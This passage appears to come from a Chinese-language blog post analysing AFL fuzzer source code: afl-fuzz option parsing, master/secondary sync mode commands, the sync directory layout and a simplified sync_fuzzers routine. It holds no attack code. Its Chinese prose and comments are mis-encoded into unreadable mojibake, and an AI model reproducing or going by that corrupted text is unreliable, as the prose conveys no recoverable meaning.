class="number">0</span>)</span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">        <span class="comment">// å„ç§é€‰é¡¹å¤„ç†</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">  in_dir = optarg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">  out_dir = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">    u8* c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">    sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">          !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">          master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">  sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">  out_file = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">  extras_dir = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">    u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">    u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">    mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      mem_limit = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">    cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">        optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">  skip_deterministic = <span class="number">1</span>;</span><br><span class="line">  use_splicing = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">     an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">     to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">     found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">     by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">     file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">  in_bitmap = optarg;</span><br><span class="line">  <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">  crash_mode = FAULT_CRASH;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">  use_banner = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">  qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>æ”¯æŒçš„ä¸»è¦é€‰é¡¹ï¼š</p><table><thead><tr><th align="left">é€‰é¡¹</th><th align="left">å‚æ•°</th><th align="left">åŠŸèƒ½</th><th align="left">é‡è¦æ€§</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">ç›®å½•</td><td align="left">è¾“å…¥æµ‹è¯•ç”¨ä¾‹ç›®å½•</td><td align="left">å¿…éœ€</td></tr><tr><td align="left">-o</td><td align="left">ç›®å½•</td><td align="left">è¾“å‡ºç»“æœç›®å½•</td><td align="left">å¿…éœ€</td></tr><tr><td align="left">-f</td><td align="left">æ–‡ä»¶</td><td align="left">ç›®æ ‡ç¨‹åºè¾“å…¥æ–‡ä»¶</td><td align="left">å¯é€‰</td></tr><tr><td align="left">-m</td><td align="left">å†…å­˜</td><td align="left">å†…å­˜é™åˆ¶</td><td align="left">é‡è¦</td></tr><tr><td align="left">-t</td><td align="left">æ—¶é—´</td><td align="left">æ‰§è¡Œè¶…æ—¶</td><td align="left">é‡è¦</td></tr><tr><td align="left">-M&#x2F;-S</td><td align="left">ID</td><td align="left">ä¸»&#x2F;ä»åŒæ­¥æ¨¡å¼</td><td align="left">å¹¶è¡Œ</td></tr><tr><td align="left">-x</td><td align="left">ç›®å½•</td><td align="left">å­—å…¸ç›®å½•</td><td align="left">ä¼˜åŒ–</td></tr><tr><td align="left">-Q</td><td align="left">-</td><td align="left">QEMUæ¨¡å¼</td><td align="left">ç‰¹æ®Š</td></tr><tr><td align="left">-C</td><td align="left">-</td><td align="left">å´©æºƒæ¨¡å¼</td><td align="left">è°ƒè¯•</td></tr><tr><td align="left">-n</td><td align="left">-</td><td align="left">å“‘æ¨¡å¼</td><td align="left">ç‰¹æ®Š</td></tr><tr><td align="left">-B</td><td align="left">bitmap</td><td align="left">åŸºäºå·²æœ‰è¦†ç›–ç‡</td><td align="left"></td></tr></tbody></table><blockquote><p><code>extern char *optarg;</code></p><p><code>optarg</code>å®šä¹‰åœ¨<code>&lt;unistd.h&gt;</code>å¤´æ–‡ä»¶ä¸­ï¼Œç”± <code>getopt()</code> å‡½æ•°ç»´æŠ¤ï¼Œå½“ <code>getopt()</code> è§£æåˆ°ä¸€ä¸ªéœ€è¦å‚æ•°çš„é€‰é¡¹æ—¶ï¼Œä¼šå°†è¯¥å‚æ•°çš„åœ°å€èµ‹å€¼ç»™ <code>optarg</code>ï¼Œä¾‹å¦‚æ­¤æ—¶æœ‰<code>-i /tmp/test</code>è¿™ä¸ªé€‰é¡¹ï¼Œå¦‚æœgetoptçš„ç¬¬ä¸‰ä¸ªå‚æ•°æœ‰<code>i:</code>çš„è¯ï¼Œé‚£ä¹ˆæ­¤æ—¶<code>*optarg=&quot;/tmp/test&quot;</code>ğŸ˜</p></blockquote><h4 id="â€œMâ€-â€œSâ€é€‰é¡¹"><a href="#â€œMâ€-â€œSâ€é€‰é¡¹" class="headerlink" title="â€œMâ€ &amp; â€œSâ€é€‰é¡¹"></a>â€œMâ€ &amp; â€œSâ€é€‰é¡¹</h4><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸»&#x2F;ä»åŒæ­¥æ¨¡å¼ï¼Œafl-fuzzçš„å•ä¸ªfuzzeråªå ç”¨ä¸€ä¸ªè¿›ç¨‹ï¼Œå› æ­¤åªèƒ½å ç”¨ä¸€ä¸ªæ ¸å¿ƒï¼Œè€Œåœ¨å¤šæ ¸ç³»ç»Ÿä¸­å¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªfuzzerå®ä¾‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨ä¸»å®ä¾‹</span></span><br><span class="line">./afl-fuzz -i input -o sync_dir -M fuzzer01 ./target @@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨ä»å®ä¾‹</span></span><br><span class="line">./afl-fuzz -i input -o sync_dir -S fuzzer02 ./target @@</span><br><span class="line">./afl-fuzz -i input -o sync_dir -S fuzzer03 ./target @@</span><br></pre></td></tr></table></figure><p>å®ä¾‹ä¸å®ä¾‹ä¹‹é—´çš„å…±äº«æ–¹å¼æ˜¯é€šè¿‡å°†ä¿¡æ¯è¾“å…¥åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œæ¯ä¸ªfuzzerå‘¨æœŸæ€§çš„checkæ–‡ä»¶å¤¹ä¸‹å…¶ä»–fuzzerç”Ÿæˆçš„ç”¨ä¾‹ï¼Œå°†æœ‰ç”¨çš„ç”¨ä¾‹åŠ å…¥åˆ°è‡ªå·±çš„ç”¨ä¾‹é›†ä¸­ï¼Œè¿™é‡Œå¯ä»¥è¯¦ç»†åˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sync_dir/</span><br><span class="line">â”œâ”€â”€ fuzzer01/           # ä¸»å®ä¾‹ (-M)</span><br><span class="line">â”‚   â”œâ”€â”€ queue/          # æµ‹è¯•ç”¨ä¾‹é˜Ÿåˆ—</span><br><span class="line">â”‚   â”œâ”€â”€ crashes/        # å´©æºƒæ ·æœ¬</span><br><span class="line">â”‚   â”œâ”€â”€ hangs/         # æŒ‚èµ·æ ·æœ¬</span><br><span class="line">â”‚   â””â”€â”€ .synced/       # åŒæ­¥çŠ¶æ€è®°å½•</span><br><span class="line">â”‚       â”œâ”€â”€ fuzzer02   # è®°å½•ä»fuzzer02åŒæ­¥åˆ°çš„ä½ç½®</span><br><span class="line">â”‚       â””â”€â”€ fuzzer03   # è®°å½•ä»fuzzer03åŒæ­¥åˆ°çš„ä½ç½®</span><br><span class="line">â”œâ”€â”€ fuzzer02/          # ä»å®ä¾‹ (-S)</span><br><span class="line">â”‚   â”œâ”€â”€ queue/</span><br><span class="line">â”‚   â””â”€â”€ .synced/</span><br><span class="line">â””â”€â”€ fuzzer03/          # ä»å®ä¾‹ (-S)</span><br><span class="line">    â”œâ”€â”€ queue/</span><br><span class="line">    â””â”€â”€ .synced/</span><br></pre></td></tr></table></figure><p>ç›®å½•ç»“æ„å¤§è‡´ä¼šæ˜¯è¿™æ ·çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸»å¾ªç¯ä¸­çš„åŒæ­¥è°ƒç”¨</span></span><br><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYNC_INTERVAL 5  <span class="comment">// æ¯5æ¬¡fuzz_one()è°ƒç”¨ååŒæ­¥ä¸€æ¬¡</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŒæ­¥æ—¶æœºæ˜¯5æ¬¡</p><h5 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sync_fuzzers</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    DIR* sd;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">dirent</span>* sd_ent;</span><br><span class="line">    u32 sync_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. æ‰“å¼€åŒæ­¥ç›®å½•</span></span><br><span class="line">    sd = <span class="built_in">opendir</span>(sync_dir);</span><br><span class="line">    <span class="keyword">if</span> (!sd) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, sync_dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. éå†åŒæ­¥ç›®å½•ä¸­çš„æ‰€æœ‰fuzzerå®ä¾‹</span></span><br><span class="line">    <span class="keyword">while</span> ((sd_ent = <span class="built_in">readdir</span>(sd))) &#123;</span><br><span class="line">        <span class="comment">// è·³è¿‡è‡ªå·±å’Œéšè—æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (sd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> || !<span class="built_in">strcmp</span>(sync_id, sd_ent-&gt;d_name)) </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æ£€æŸ¥æ˜¯å¦æœ‰queueå­ç›®å½•</span></span><br><span class="line">        qd_path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s/queue&quot;</span>, sync_dir, sd_ent-&gt;d_name);</span><br><span class="line">        <span class="keyword">if</span> (!(qd = <span class="built_in">opendir</span>(qd_path))) &#123;</span><br><span class="line">            <span class="built_in">ck_free</span>(qd_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. è¯»å–åŒæ­¥çŠ¶æ€</span></span><br><span class="line">        qd_synced_path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.synced/%s&quot;</span>, out_dir, sd_ent-&gt;d_name);</span><br><span class="line">        id_fd = <span class="built_in">open</span>(qd_synced_path, O_RDWR | O_CREAT, <span class="number">0600</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è¯»å–ä¸Šæ¬¡åŒæ­¥åˆ°çš„æµ‹è¯•ç”¨ä¾‹ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">read</span>(id_fd, &amp;min_accept, <span class="built_in">sizeof</span>(u32)) &gt; <span class="number">0</span>) </span><br><span class="line">            <span class="built_in">lseek</span>(id_fd, <span class="number">0</span>, SEEK_SET);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éå†å…¶ä»–fuzzerçš„é˜Ÿåˆ—æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">while</span> ((qd_ent = <span class="built_in">readdir</span>(qd))) &#123;</span><br><span class="line">    <span class="comment">// è§£ææ–‡ä»¶åï¼Œæå–ç”¨ä¾‹ID</span></span><br><span class="line">    <span class="keyword">if</span> (qd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> ||</span><br><span class="line">        <span class="built_in">sscanf</span>(qd_ent-&gt;d_name, 